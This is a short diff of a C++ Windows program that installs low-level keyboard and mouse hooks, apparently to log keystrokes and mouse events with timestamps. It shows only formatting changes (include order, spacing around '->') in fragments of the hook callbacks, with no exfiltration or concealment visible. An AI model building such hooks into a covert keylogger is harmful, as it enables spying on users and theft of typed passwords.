@@ -1,7 +1,5 @@
-#include <bits/stdc++.h>
 #include <windows.h>
-
-using namespace std;
+#include <bits/stdc++.h>
 
 int n;
 
@@ -27,7 +25,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 	KBDLLHOOKSTRUCT* ks = (KBDLLHOOKSTRUCT*)lParam;		// 包含低级键盘输入事件信息
 	char data[1024];
 
-	DWORD code = ks->vkCode;
+	DWORD code = ks -> vkCode;
 
 	std::string t = get_time();
 	char state[20];
@@ -68,7 +66,7 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
 	char data[1024];
 
 	MOUSEHOOKSTRUCT* ms = (MOUSEHOOKSTRUCT*)lParam;
-	POINT pt = ms->pt;
+	POINT pt = ms -> pt;
 
 	char state[20] = "未识别";
 
